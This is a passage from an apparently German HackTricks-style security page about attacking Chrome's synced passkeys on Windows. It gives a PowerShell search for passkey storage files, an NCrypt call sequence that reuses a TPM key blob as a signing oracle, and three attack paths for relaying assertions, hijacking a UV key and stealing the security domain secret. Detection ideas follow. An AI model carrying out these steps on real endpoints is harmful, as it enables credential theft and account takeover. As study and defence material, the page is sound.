- **`Sync Data\LevelDB`** speichert protobuf-codierte **`WebauthnCredentialSpecifics`**-Datensätze. Ein Prozess desselben Benutzers kann die **RP ID**, den **Benutzernamen**, die **Credential-ID** und verschlüsseltes Private-Key-Material für synchronisierte Passkeys auflisten.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** speichert den lokalen Geräteeinschreibungsstatus, etwa **`wrapped_identity_private_key`** und das verpackte Geheimnis, das zum Wiederherstellen synchronisierter Anmeldedaten verwendet wird.<sup>[[4]](#references)</sup>

Schnelle Ersteinschätzung:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-gebundene Schlüssel-Blobs lassen sich dennoch als lokale Signier-Orakel missbrauchen

Wenn der Browser einen TPM-gestützten Identitätsschlüssel als **`NCRYPT_OPAQUE_KEY_BLOB`** exportiert und dieses Blob in einem für Benutzer zugänglichen Zustand speichert, muss Malware **nicht** den rohen privaten Schlüssel extrahieren. Sie kann das Blob einfach auf **demselben Computer** erneut importieren und das lokale TPM auffordern, vom Angreifer kontrollierte Daten zu signieren:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Dies bedeutet: **Hardware-Bindung verhindert den Export vom Gerät, aber nicht die Nutzung durch denselben Benutzer auf dem kompromittierten Endpunkt**.

### Praktische Angriffspfade

1. **Pass-ta-key / Weiterleitung der Geräteidentität**<sup>[[4]](#references)</sup>
   - `WebauthnCredentialSpecifics` aus Chromes LevelDB auflisten.
   - Einen Passkey-Login starten und eine frische WebAuthn-Challenge abrufen.
   - Den gestohlenen `wrapped_identity_private_key`-Blob auf dem TPM des Opfers verwenden, um die Bindung der Cloud-Authenticator-Anfrage zu signieren.
   - Die zurückgegebene Assertion an die vertrauende Partei weiterleiten.
   - Das ist besonders wertvoll, wenn die RP `userVerification=preferred` akzeptiert oder Assertions mit **`UV=0`** nicht zurückweist.
2. **Übernahme eines ausstehenden UV-Schlüssels**<sup>[[4]](#references)</sup>
   - Das erneute Onboarding erzwingen, indem `passkey_enclave_state` gelöscht oder eine gültige signierte `device/forget`-Operation gesendet wird.
   - Falls das Onboarding das Gerät im Zustand **`uv_key_pending`** belässt, einen vom Angreifer kontrollierten öffentlichen UV-Schlüssel registrieren.
   - Wenn der Anbieter die Attestation / den Ursprung aus sicherer Hardware für den neuen UV-Schlüssel nicht überprüft, werden spätere Signaturen des Angreiferschlüssels als **`UV=1`** behandelt.
3. **Diebstahl des Master-Secrets / der SDS-Wiederherstellung**<sup>[[4]](#references)</sup>
   - Eine Wiederherstellung oder erneute Anmeldung erzwingen, sodass Chrome das synchronisierte Passkey-Master-Secret abruft.
   - Die Neuerstellung/Änderung von `passkey_enclave_state` beobachten und dann den Chrome-Speicher auslesen, solange das Klartext-**Security-Domain-Secret (SDS)** darin vorhanden ist.
   - Mit der wiederhergestellten SDS die verschlüsselten Felder in jedem `WebauthnCredentialSpecifics`-Datensatz entschlüsseln und portable WebAuthn-Private-Keys wiederherstellen.

### DFIR- / Erkennungsideen

- Das **Löschen/Neuerstellen** von `passkey_enclave_state` überwachen.<sup>[[4]](#references)</sup>
- Auf ungewöhnliche Zugriffe nicht zum Browser gehörender Prozesse auf Chromes **`Sync Data\LevelDB`** aufmerksam machen.
- Auf **Chrome-Speicherdumps** oder verdächtige prozessübergreifende Speicherzugriffe aufmerksam machen.
- Wiederholte Aufforderungen zur Eingabe der **Google Password Manager-Wiederherstellungs-PIN** oder unerwartetes erneutes Onboarding untersuchen.
- Beachten, dass WebAuthn-**`signCount`** bei synchronisierten Passkeys häufig nicht hilfreich ist, da der Wert konstant bleiben kann. Die klassische Erkennung von Klonen ist daher unzuverlässig.

## References

- [1] [Unit 42 – Eine Untersuchung jahrelang unentdeckter Operationen gegen wichtige Sektoren](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word-VBA-Makro-Phishing über SMTP → Entschlüsselung von hMailServer-Anmeldedaten → Veeam CVE-2023-27532 zu SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Im Inneren von Ink Dragon: Das Relay-Netzwerk und die internen Abläufe einer verdeckt agierenden offensiven Operation aufgedeckt](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Eine neuartige Angriffsfläche bei passwortloser Authentifizierung](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG-Schlüsselspeicher](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows-Hacking: Angriffe auf Microsoft-Systeme und -Netzwerke](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Wie der Active-Directory-Datenspeicher wirklich funktioniert: Einblicke in NTDS.dit (Teil 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – Passwörter mit Remote-Lsass-Dump auslesen](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho erweitert sein Cyber-Spionage-Arsenal mit dem Still-Toolkit](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW-Funktion und `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy-Modus `/B` für Sicherungen](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram-FAQ – Aktive Sitzungen beenden](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
